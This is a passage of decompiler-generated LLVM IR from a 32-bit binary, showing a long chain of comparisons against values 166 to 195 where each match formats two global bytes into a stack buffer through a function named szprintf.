dec_label_pc_804bc14:                             ; preds = %dec_label_pc_804bc0b
  %v0_804bc14 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bc14 = zext i8 %v0_804bc14 to i32
  store i32 %v1_804bc14, i32* @edx, align 4
  %v0_804bc20 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bc20 = zext i8 %v0_804bc20 to i32
  %v2_804bc2f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc2f, i32* @ebx, align 4
  %v5_804bc36 = call i32 @szprintf(i32 %v2_804bc2f, i32 ptrtoint ([14 x i8]* @global_var_80582ba.196 to i32), i32 %v1_804bc20, i32 %v1_804bc14)
  br label %dec_label_pc_804bc3e

dec_label_pc_804bc3e:                             ; preds = %dec_label_pc_804bc0b, %dec_label_pc_804bc14
  %v12_804bc3e = icmp eq i32 %v11_8049ca7, 166
  %v1_804bc45 = icmp eq i1 %v12_804bc3e, false
  br i1 %v1_804bc45, label %dec_label_pc_804bc71, label %dec_label_pc_804bc47

dec_label_pc_804bc47:                             ; preds = %dec_label_pc_804bc3e
  %v0_804bc47 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bc47 = zext i8 %v0_804bc47 to i32
  store i32 %v1_804bc47, i32* @edx, align 4
  %v0_804bc53 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bc53 = zext i8 %v0_804bc53 to i32
  %v2_804bc62 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc62, i32* @ebx, align 4
  %v5_804bc69 = call i32 @szprintf(i32 %v2_804bc62, i32 ptrtoint ([14 x i8]* @global_var_80582c8.197 to i32), i32 %v1_804bc53, i32 %v1_804bc47)
  br label %dec_label_pc_804bc71

dec_label_pc_804bc71:                             ; preds = %dec_label_pc_804bc3e, %dec_label_pc_804bc47
  %v12_804bc71 = icmp eq i32 %v11_8049ca7, 167
  %v1_804bc78 = icmp eq i1 %v12_804bc71, false
  br i1 %v1_804bc78, label %dec_label_pc_804bca4, label %dec_label_pc_804bc7a

dec_label_pc_804bc7a:                             ; preds = %dec_label_pc_804bc71
  %v0_804bc7a = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bc7a = zext i8 %v0_804bc7a to i32
  store i32 %v1_804bc7a, i32* @edx, align 4
  %v0_804bc86 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bc86 = zext i8 %v0_804bc86 to i32
  %v2_804bc95 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc95, i32* @ebx, align 4
  %v5_804bc9c = call i32 @szprintf(i32 %v2_804bc95, i32 ptrtoint ([14 x i8]* @global_var_8058275.191 to i32), i32 %v1_804bc86, i32 %v1_804bc7a)
  br label %dec_label_pc_804bca4

dec_label_pc_804bca4:                             ; preds = %dec_label_pc_804bc71, %dec_label_pc_804bc7a
  %v12_804bca4 = icmp eq i32 %v11_8049ca7, 168
  %v1_804bcab = icmp eq i1 %v12_804bca4, false
  br i1 %v1_804bcab, label %dec_label_pc_804bcd7, label %dec_label_pc_804bcad

dec_label_pc_804bcad:                             ; preds = %dec_label_pc_804bca4
  %v0_804bcad = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bcad = zext i8 %v0_804bcad to i32
  store i32 %v1_804bcad, i32* @edx, align 4
  %v0_804bcb9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bcb9 = zext i8 %v0_804bcb9 to i32
  %v2_804bcc8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcc8, i32* @ebx, align 4
  %v5_804bccf = call i32 @szprintf(i32 %v2_804bcc8, i32 ptrtoint ([15 x i8]* @global_var_80582d6.198 to i32), i32 %v1_804bcb9, i32 %v1_804bcad)
  br label %dec_label_pc_804bcd7

dec_label_pc_804bcd7:                             ; preds = %dec_label_pc_804bca4, %dec_label_pc_804bcad
  %v12_804bcd7 = icmp eq i32 %v11_8049ca7, 169
  %v1_804bcde = icmp eq i1 %v12_804bcd7, false
  br i1 %v1_804bcde, label %dec_label_pc_804bd0a, label %dec_label_pc_804bce0

dec_label_pc_804bce0:                             ; preds = %dec_label_pc_804bcd7
  %v0_804bce0 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bce0 = zext i8 %v0_804bce0 to i32
  store i32 %v1_804bce0, i32* @edx, align 4
  %v0_804bcec = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bcec = zext i8 %v0_804bcec to i32
  %v2_804bcfb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcfb, i32* @ebx, align 4
  %v5_804bd02 = call i32 @szprintf(i32 %v2_804bcfb, i32 ptrtoint ([14 x i8]* @global_var_80582e5.199 to i32), i32 %v1_804bcec, i32 %v1_804bce0)
  br label %dec_label_pc_804bd0a

dec_label_pc_804bd0a:                             ; preds = %dec_label_pc_804bcd7, %dec_label_pc_804bce0
  %v12_804bd0a = icmp eq i32 %v11_8049ca7, 171
  %v1_804bd11 = icmp eq i1 %v12_804bd0a, false
  br i1 %v1_804bd11, label %dec_label_pc_804bd3d, label %dec_label_pc_804bd13

dec_label_pc_804bd13:                             ; preds = %dec_label_pc_804bd0a
  %v0_804bd13 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bd13 = zext i8 %v0_804bd13 to i32
  store i32 %v1_804bd13, i32* @edx, align 4
  %v0_804bd1f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bd1f = zext i8 %v0_804bd1f to i32
  %v2_804bd2e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd2e, i32* @ebx, align 4
  %v5_804bd35 = call i32 @szprintf(i32 %v2_804bd2e, i32 ptrtoint ([14 x i8]* @global_var_80582f3.200 to i32), i32 %v1_804bd1f, i32 %v1_804bd13)
  br label %dec_label_pc_804bd3d

dec_label_pc_804bd3d:                             ; preds = %dec_label_pc_804bd0a, %dec_label_pc_804bd13
  %v12_804bd3d = icmp eq i32 %v11_8049ca7, 172
  %v1_804bd44 = icmp eq i1 %v12_804bd3d, false
  br i1 %v1_804bd44, label %dec_label_pc_804bd70, label %dec_label_pc_804bd46

dec_label_pc_804bd46:                             ; preds = %dec_label_pc_804bd3d
  %v0_804bd46 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bd46 = zext i8 %v0_804bd46 to i32
  store i32 %v1_804bd46, i32* @edx, align 4
  %v0_804bd52 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bd52 = zext i8 %v0_804bd52 to i32
  %v2_804bd61 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd61, i32* @ebx, align 4
  %v5_804bd68 = call i32 @szprintf(i32 %v2_804bd61, i32 ptrtoint ([14 x i8]* @global_var_8058301.201 to i32), i32 %v1_804bd52, i32 %v1_804bd46)
  br label %dec_label_pc_804bd70

dec_label_pc_804bd70:                             ; preds = %dec_label_pc_804bd3d, %dec_label_pc_804bd46
  %v12_804bd70 = icmp eq i32 %v11_8049ca7, 173
  %v1_804bd77 = icmp eq i1 %v12_804bd70, false
  br i1 %v1_804bd77, label %dec_label_pc_804bda3, label %dec_label_pc_804bd79

dec_label_pc_804bd79:                             ; preds = %dec_label_pc_804bd70
  %v0_804bd79 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bd79 = zext i8 %v0_804bd79 to i32
  store i32 %v1_804bd79, i32* @edx, align 4
  %v0_804bd85 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bd85 = zext i8 %v0_804bd85 to i32
  %v2_804bd94 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd94, i32* @ebx, align 4
  %v5_804bd9b = call i32 @szprintf(i32 %v2_804bd94, i32 ptrtoint ([14 x i8]* @global_var_805830f.202 to i32), i32 %v1_804bd85, i32 %v1_804bd79)
  br label %dec_label_pc_804bda3

dec_label_pc_804bda3:                             ; preds = %dec_label_pc_804bd70, %dec_label_pc_804bd79
  %v12_804bda3 = icmp eq i32 %v11_8049ca7, 174
  %v1_804bdaa = icmp eq i1 %v12_804bda3, false
  br i1 %v1_804bdaa, label %dec_label_pc_804bdd6, label %dec_label_pc_804bdac

dec_label_pc_804bdac:                             ; preds = %dec_label_pc_804bda3
  %v0_804bdac = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bdac = zext i8 %v0_804bdac to i32
  store i32 %v1_804bdac, i32* @edx, align 4
  %v0_804bdb8 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bdb8 = zext i8 %v0_804bdb8 to i32
  %v2_804bdc7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdc7, i32* @ebx, align 4
  %v5_804bdce = call i32 @szprintf(i32 %v2_804bdc7, i32 ptrtoint ([13 x i8]* @global_var_805831d.203 to i32), i32 %v1_804bdb8, i32 %v1_804bdac)
  br label %dec_label_pc_804bdd6

dec_label_pc_804bdd6:                             ; preds = %dec_label_pc_804bda3, %dec_label_pc_804bdac
  %v12_804bdd6 = icmp eq i32 %v11_8049ca7, 175
  %v1_804bddd = icmp eq i1 %v12_804bdd6, false
  br i1 %v1_804bddd, label %dec_label_pc_804be09, label %dec_label_pc_804bddf

dec_label_pc_804bddf:                             ; preds = %dec_label_pc_804bdd6
  %v0_804bddf = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bddf = zext i8 %v0_804bddf to i32
  store i32 %v1_804bddf, i32* @edx, align 4
  %v0_804bdeb = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bdeb = zext i8 %v0_804bdeb to i32
  %v2_804bdfa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdfa, i32* @ebx, align 4
  %v5_804be01 = call i32 @szprintf(i32 %v2_804bdfa, i32 ptrtoint ([14 x i8]* @global_var_805832a.204 to i32), i32 %v1_804bdeb, i32 %v1_804bddf)
  br label %dec_label_pc_804be09

dec_label_pc_804be09:                             ; preds = %dec_label_pc_804bdd6, %dec_label_pc_804bddf
  %v9_804be09 = icmp eq i32 %v11_8049ca7, 176
  %v1_804be10 = icmp eq i1 %v9_804be09, false
  br i1 %v1_804be10, label %dec_label_pc_804be3c, label %dec_label_pc_804be12

dec_label_pc_804be12:                             ; preds = %dec_label_pc_804be09
  %v0_804be12 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804be12 = zext i8 %v0_804be12 to i32
  store i32 %v1_804be12, i32* @edx, align 4
  %v0_804be1e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804be1e = zext i8 %v0_804be1e to i32
  %v2_804be2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be2d, i32* @ebx, align 4
  %v5_804be34 = call i32 @szprintf(i32 %v2_804be2d, i32 ptrtoint ([14 x i8]* @global_var_8058338.205 to i32), i32 %v1_804be1e, i32 %v1_804be12)
  br label %dec_label_pc_804be3c

dec_label_pc_804be3c:                             ; preds = %dec_label_pc_804be09, %dec_label_pc_804be12
  %v12_804be3c = icmp eq i32 %v11_8049ca7, 177
  %v1_804be43 = icmp eq i1 %v12_804be3c, false
  br i1 %v1_804be43, label %dec_label_pc_804be6f, label %dec_label_pc_804be45

dec_label_pc_804be45:                             ; preds = %dec_label_pc_804be3c
  %v0_804be45 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804be45 = zext i8 %v0_804be45 to i32
  store i32 %v1_804be45, i32* @edx, align 4
  %v0_804be51 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804be51 = zext i8 %v0_804be51 to i32
  %v2_804be60 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be60, i32* @ebx, align 4
  %v5_804be67 = call i32 @szprintf(i32 %v2_804be60, i32 ptrtoint ([14 x i8]* @global_var_8058346.206 to i32), i32 %v1_804be51, i32 %v1_804be45)
  br label %dec_label_pc_804be6f

dec_label_pc_804be6f:                             ; preds = %dec_label_pc_804be3c, %dec_label_pc_804be45
  %v12_804be6f = icmp eq i32 %v11_8049ca7, 178
  %v1_804be76 = icmp eq i1 %v12_804be6f, false
  br i1 %v1_804be76, label %dec_label_pc_804bea2, label %dec_label_pc_804be78

dec_label_pc_804be78:                             ; preds = %dec_label_pc_804be6f
  %v0_804be78 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804be78 = zext i8 %v0_804be78 to i32
  store i32 %v1_804be78, i32* @edx, align 4
  %v0_804be84 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804be84 = zext i8 %v0_804be84 to i32
  %v2_804be93 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be93, i32* @ebx, align 4
  %v5_804be9a = call i32 @szprintf(i32 %v2_804be93, i32 ptrtoint ([13 x i8]* @global_var_8058354.207 to i32), i32 %v1_804be84, i32 %v1_804be78)
  br label %dec_label_pc_804bea2

dec_label_pc_804bea2:                             ; preds = %dec_label_pc_804be6f, %dec_label_pc_804be78
  %v12_804bea2 = icmp eq i32 %v11_8049ca7, 179
  %v1_804bea9 = icmp eq i1 %v12_804bea2, false
  br i1 %v1_804bea9, label %dec_label_pc_804bed5, label %dec_label_pc_804beab

dec_label_pc_804beab:                             ; preds = %dec_label_pc_804bea2
  %v0_804beab = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804beab = zext i8 %v0_804beab to i32
  store i32 %v1_804beab, i32* @edx, align 4
  %v0_804beb7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804beb7 = zext i8 %v0_804beb7 to i32
  %v2_804bec6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bec6, i32* @ebx, align 4
  %v5_804becd = call i32 @szprintf(i32 %v2_804bec6, i32 ptrtoint ([13 x i8]* @global_var_8058361.208 to i32), i32 %v1_804beb7, i32 %v1_804beab)
  br label %dec_label_pc_804bed5

dec_label_pc_804bed5:                             ; preds = %dec_label_pc_804bea2, %dec_label_pc_804beab
  %v12_804bed5 = icmp eq i32 %v11_8049ca7, 180
  %v1_804bedc = icmp eq i1 %v12_804bed5, false
  br i1 %v1_804bedc, label %dec_label_pc_804bf08, label %dec_label_pc_804bede

dec_label_pc_804bede:                             ; preds = %dec_label_pc_804bed5
  %v0_804bede = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bede = zext i8 %v0_804bede to i32
  store i32 %v1_804bede, i32* @edx, align 4
  %v0_804beea = load i8, i8* @global_var_805b559.40, align 1
  %v1_804beea = zext i8 %v0_804beea to i32
  %v2_804bef9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bef9, i32* @ebx, align 4
  %v5_804bf00 = call i32 @szprintf(i32 %v2_804bef9, i32 ptrtoint ([13 x i8]* @global_var_805836e.209 to i32), i32 %v1_804beea, i32 %v1_804bede)
  br label %dec_label_pc_804bf08

dec_label_pc_804bf08:                             ; preds = %dec_label_pc_804bed5, %dec_label_pc_804bede
  %v12_804bf08 = icmp eq i32 %v11_8049ca7, 181
  %v1_804bf0f = icmp eq i1 %v12_804bf08, false
  br i1 %v1_804bf0f, label %dec_label_pc_804bf3b, label %dec_label_pc_804bf11

dec_label_pc_804bf11:                             ; preds = %dec_label_pc_804bf08
  %v0_804bf11 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bf11 = zext i8 %v0_804bf11 to i32
  store i32 %v1_804bf11, i32* @edx, align 4
  %v0_804bf1d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bf1d = zext i8 %v0_804bf1d to i32
  %v2_804bf2c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf2c, i32* @ebx, align 4
  %v5_804bf33 = call i32 @szprintf(i32 %v2_804bf2c, i32 ptrtoint ([13 x i8]* @global_var_805837b.210 to i32), i32 %v1_804bf1d, i32 %v1_804bf11)
  br label %dec_label_pc_804bf3b

dec_label_pc_804bf3b:                             ; preds = %dec_label_pc_804bf08, %dec_label_pc_804bf11
  %v12_804bf3b = icmp eq i32 %v11_8049ca7, 182
  %v1_804bf42 = icmp eq i1 %v12_804bf3b, false
  br i1 %v1_804bf42, label %dec_label_pc_804bf6e, label %dec_label_pc_804bf44

dec_label_pc_804bf44:                             ; preds = %dec_label_pc_804bf3b
  %v0_804bf44 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bf44 = zext i8 %v0_804bf44 to i32
  store i32 %v1_804bf44, i32* @edx, align 4
  %v0_804bf50 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bf50 = zext i8 %v0_804bf50 to i32
  %v2_804bf5f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf5f, i32* @ebx, align 4
  %v5_804bf66 = call i32 @szprintf(i32 %v2_804bf5f, i32 ptrtoint ([13 x i8]* @global_var_8058388.211 to i32), i32 %v1_804bf50, i32 %v1_804bf44)
  br label %dec_label_pc_804bf6e

dec_label_pc_804bf6e:                             ; preds = %dec_label_pc_804bf3b, %dec_label_pc_804bf44
  %v12_804bf6e = icmp eq i32 %v11_8049ca7, 183
  %v1_804bf75 = icmp eq i1 %v12_804bf6e, false
  br i1 %v1_804bf75, label %dec_label_pc_804bfa1, label %dec_label_pc_804bf77

dec_label_pc_804bf77:                             ; preds = %dec_label_pc_804bf6e
  %v0_804bf77 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bf77 = zext i8 %v0_804bf77 to i32
  store i32 %v1_804bf77, i32* @edx, align 4
  %v0_804bf83 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bf83 = zext i8 %v0_804bf83 to i32
  %v2_804bf92 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf92, i32* @ebx, align 4
  %v5_804bf99 = call i32 @szprintf(i32 %v2_804bf92, i32 ptrtoint ([13 x i8]* @global_var_8057cbb.84 to i32), i32 %v1_804bf83, i32 %v1_804bf77)
  br label %dec_label_pc_804bfa1

dec_label_pc_804bfa1:                             ; preds = %dec_label_pc_804bf6e, %dec_label_pc_804bf77
  %v12_804bfa1 = icmp eq i32 %v11_8049ca7, 184
  %v1_804bfa8 = icmp eq i1 %v12_804bfa1, false
  br i1 %v1_804bfa8, label %dec_label_pc_804bfd4, label %dec_label_pc_804bfaa

dec_label_pc_804bfaa:                             ; preds = %dec_label_pc_804bfa1
  %v0_804bfaa = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bfaa = zext i8 %v0_804bfaa to i32
  store i32 %v1_804bfaa, i32* @edx, align 4
  %v0_804bfb6 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bfb6 = zext i8 %v0_804bfb6 to i32
  %v2_804bfc5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfc5, i32* @ebx, align 4
  %v5_804bfcc = call i32 @szprintf(i32 %v2_804bfc5, i32 ptrtoint ([13 x i8]* @global_var_8058395.212 to i32), i32 %v1_804bfb6, i32 %v1_804bfaa)
  br label %dec_label_pc_804bfd4

dec_label_pc_804bfd4:                             ; preds = %dec_label_pc_804bfa1, %dec_label_pc_804bfaa
  %v12_804bfd4 = icmp eq i32 %v11_8049ca7, 185
  %v1_804bfdb = icmp eq i1 %v12_804bfd4, false
  br i1 %v1_804bfdb, label %dec_label_pc_804c007, label %dec_label_pc_804bfdd

dec_label_pc_804bfdd:                             ; preds = %dec_label_pc_804bfd4
  %v0_804bfdd = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bfdd = zext i8 %v0_804bfdd to i32
  store i32 %v1_804bfdd, i32* @edx, align 4
  %v0_804bfe9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bfe9 = zext i8 %v0_804bfe9 to i32
  %v2_804bff8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bff8, i32* @ebx, align 4
  %v5_804bfff = call i32 @szprintf(i32 %v2_804bff8, i32 ptrtoint ([13 x i8]* @global_var_80583a2.213 to i32), i32 %v1_804bfe9, i32 %v1_804bfdd)
  br label %dec_label_pc_804c007

dec_label_pc_804c007:                             ; preds = %dec_label_pc_804bfd4, %dec_label_pc_804bfdd
  %v12_804c007 = icmp eq i32 %v11_8049ca7, 186
  %v1_804c00e = icmp eq i1 %v12_804c007, false
  br i1 %v1_804c00e, label %dec_label_pc_804c03a, label %dec_label_pc_804c010

dec_label_pc_804c010:                             ; preds = %dec_label_pc_804c007
  %v0_804c010 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c010 = zext i8 %v0_804c010 to i32
  store i32 %v1_804c010, i32* @edx, align 4
  %v0_804c01c = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c01c = zext i8 %v0_804c01c to i32
  %v2_804c02b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c02b, i32* @ebx, align 4
  %v5_804c032 = call i32 @szprintf(i32 %v2_804c02b, i32 ptrtoint ([14 x i8]* @global_var_80583af.214 to i32), i32 %v1_804c01c, i32 %v1_804c010)
  br label %dec_label_pc_804c03a

dec_label_pc_804c03a:                             ; preds = %dec_label_pc_804c007, %dec_label_pc_804c010
  %v12_804c03a = icmp eq i32 %v11_8049ca7, 187
  %v1_804c041 = icmp eq i1 %v12_804c03a, false
  br i1 %v1_804c041, label %dec_label_pc_804c06d, label %dec_label_pc_804c043

dec_label_pc_804c043:                             ; preds = %dec_label_pc_804c03a
  %v0_804c043 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c043 = zext i8 %v0_804c043 to i32
  store i32 %v1_804c043, i32* @edx, align 4
  %v0_804c04f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c04f = zext i8 %v0_804c04f to i32
  %v2_804c05e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c05e, i32* @ebx, align 4
  %v5_804c065 = call i32 @szprintf(i32 %v2_804c05e, i32 ptrtoint ([14 x i8]* @global_var_80583bd.215 to i32), i32 %v1_804c04f, i32 %v1_804c043)
  br label %dec_label_pc_804c06d

dec_label_pc_804c06d:                             ; preds = %dec_label_pc_804c03a, %dec_label_pc_804c043
  %v12_804c06d = icmp eq i32 %v11_8049ca7, 188
  %v1_804c074 = icmp eq i1 %v12_804c06d, false
  br i1 %v1_804c074, label %dec_label_pc_804c0a0, label %dec_label_pc_804c076

dec_label_pc_804c076:                             ; preds = %dec_label_pc_804c06d
  %v0_804c076 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c076 = zext i8 %v0_804c076 to i32
  store i32 %v1_804c076, i32* @edx, align 4
  %v0_804c082 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c082 = zext i8 %v0_804c082 to i32
  %v2_804c091 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c091, i32* @ebx, align 4
  %v5_804c098 = call i32 @szprintf(i32 %v2_804c091, i32 ptrtoint ([14 x i8]* @global_var_80583bd.215 to i32), i32 %v1_804c082, i32 %v1_804c076)
  br label %dec_label_pc_804c0a0

dec_label_pc_804c0a0:                             ; preds = %dec_label_pc_804c06d, %dec_label_pc_804c076
  %v12_804c0a0 = icmp eq i32 %v11_8049ca7, 189
  %v1_804c0a7 = icmp eq i1 %v12_804c0a0, false
  br i1 %v1_804c0a7, label %dec_label_pc_804c0d3, label %dec_label_pc_804c0a9

dec_label_pc_804c0a9:                             ; preds = %dec_label_pc_804c0a0
  %v0_804c0a9 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c0a9 = zext i8 %v0_804c0a9 to i32
  store i32 %v1_804c0a9, i32* @edx, align 4
  %v0_804c0b5 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c0b5 = zext i8 %v0_804c0b5 to i32
  %v2_804c0c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0c4, i32* @ebx, align 4
  %v5_804c0cb = call i32 @szprintf(i32 %v2_804c0c4, i32 ptrtoint ([14 x i8]* @global_var_80583cb.216 to i32), i32 %v1_804c0b5, i32 %v1_804c0a9)
  br label %dec_label_pc_804c0d3

dec_label_pc_804c0d3:                             ; preds = %dec_label_pc_804c0a0, %dec_label_pc_804c0a9
  %v12_804c0d3 = icmp eq i32 %v11_8049ca7, 190
  %v1_804c0da = icmp eq i1 %v12_804c0d3, false
  br i1 %v1_804c0da, label %dec_label_pc_804c106, label %dec_label_pc_804c0dc

dec_label_pc_804c0dc:                             ; preds = %dec_label_pc_804c0d3
  %v0_804c0dc = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c0dc = zext i8 %v0_804c0dc to i32
  store i32 %v1_804c0dc, i32* @edx, align 4
  %v0_804c0e8 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c0e8 = zext i8 %v0_804c0e8 to i32
  %v2_804c0f7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0f7, i32* @ebx, align 4
  %v5_804c0fe = call i32 @szprintf(i32 %v2_804c0f7, i32 ptrtoint ([14 x i8]* @global_var_80583d9.217 to i32), i32 %v1_804c0e8, i32 %v1_804c0dc)
  br label %dec_label_pc_804c106

dec_label_pc_804c106:                             ; preds = %dec_label_pc_804c0d3, %dec_label_pc_804c0dc
  %v12_804c106 = icmp eq i32 %v11_8049ca7, 191
  %v1_804c10d = icmp eq i1 %v12_804c106, false
  br i1 %v1_804c10d, label %dec_label_pc_804c139, label %dec_label_pc_804c10f

dec_label_pc_804c10f:                             ; preds = %dec_label_pc_804c106
  %v0_804c10f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c10f = zext i8 %v0_804c10f to i32
  store i32 %v1_804c10f, i32* @edx, align 4
  %v0_804c11b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c11b = zext i8 %v0_804c11b to i32
  %v2_804c12a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c12a, i32* @ebx, align 4
  %v5_804c131 = call i32 @szprintf(i32 %v2_804c12a, i32 ptrtoint ([14 x i8]* @global_var_80583e7.218 to i32), i32 %v1_804c11b, i32 %v1_804c10f)
  br label %dec_label_pc_804c139

dec_label_pc_804c139:                             ; preds = %dec_label_pc_804c106, %dec_label_pc_804c10f
  %v9_804c139 = icmp eq i32 %v11_8049ca7, 192
  %v1_804c140 = icmp eq i1 %v9_804c139, false
  br i1 %v1_804c140, label %dec_label_pc_804c16c, label %dec_label_pc_804c142

dec_label_pc_804c142:                             ; preds = %dec_label_pc_804c139
  %v0_804c142 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c142 = zext i8 %v0_804c142 to i32
  store i32 %v1_804c142, i32* @edx, align 4
  %v0_804c14e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c14e = zext i8 %v0_804c14e to i32
  %v2_804c15d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c15d, i32* @ebx, align 4
  %v5_804c164 = call i32 @szprintf(i32 %v2_804c15d, i32 ptrtoint ([13 x i8]* @global_var_80583f5.219 to i32), i32 %v1_804c14e, i32 %v1_804c142)
  br label %dec_label_pc_804c16c

dec_label_pc_804c16c:                             ; preds = %dec_label_pc_804c139, %dec_label_pc_804c142
  %v12_804c16c = icmp eq i32 %v11_8049ca7, 193
  %v1_804c173 = icmp eq i1 %v12_804c16c, false
  br i1 %v1_804c173, label %dec_label_pc_804c19f, label %dec_label_pc_804c175

dec_label_pc_804c175:                             ; preds = %dec_label_pc_804c16c
  %v0_804c175 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c175 = zext i8 %v0_804c175 to i32
  store i32 %v1_804c175, i32* @edx, align 4
  %v0_804c181 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c181 = zext i8 %v0_804c181 to i32
  %v2_804c190 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c190, i32* @ebx, align 4
  %v5_804c197 = call i32 @szprintf(i32 %v2_804c190, i32 ptrtoint ([13 x i8]* @global_var_8058402.220 to i32), i32 %v1_804c181, i32 %v1_804c175)
  br label %dec_label_pc_804c19f

dec_label_pc_804c19f:                             ; preds = %dec_label_pc_804c16c, %dec_label_pc_804c175
  %v12_804c19f = icmp eq i32 %v11_8049ca7, 194
  %v1_804c1a6 = icmp eq i1 %v12_804c19f, false
  br i1 %v1_804c1a6, label %dec_label_pc_804c1d2, label %dec_label_pc_804c1a8

dec_label_pc_804c1a8:                             ; preds = %dec_label_pc_804c19f
  %v0_804c1a8 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c1a8 = zext i8 %v0_804c1a8 to i32
  store i32 %v1_804c1a8, i32* @edx, align 4
  %v0_804c1b4 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c1b4 = zext i8 %v0_804c1b4 to i32
  %v2_804c1c3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1c3, i32* @ebx, align 4
  %v5_804c1ca = call i32 @szprintf(i32 %v2_804c1c3, i32 ptrtoint ([14 x i8]* @global_var_805840f.221 to i32), i32 %v1_804c1b4, i32 %v1_804c1a8)
  br label %dec_label_pc_804c1d2

dec_label_pc_804c1d2:                             ; preds = %dec_label_pc_804c19f, %dec_label_pc_804c1a8
  %v12_804c1d2 = icmp eq i32 %v11_8049ca7, 195
  %v1_804c1d9 = icmp eq i1 %v12_804c1d2, false
  br i1 %v1_804c1d9, label %dec_label_pc_804c205, label %dec_label_pc_804c1db

dec_label_pc_804c1db:                             ; preds = %dec_label_pc_804c1d2
  %v0_804c1db = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c1db = zext i8 %v0_804c1db to i32
  store i32 %v1_804c1db, i32* @edx, align 4
  %v0_804c1e7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c1e7 = zext i8 %v0_804c1e7 to i32
  %v2_804c1f6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1f6, i32* @ebx, align 4
  %v5_804c1fd = call i32 @szprintf(i32 %v2_804c1f6, i32 ptrtoint ([17 x i8]* @global_var_805841d.222 to i32), i32 %v1_804c1e7, i32 %v1_804c1db)
  br label %dec_label_pc_804c205

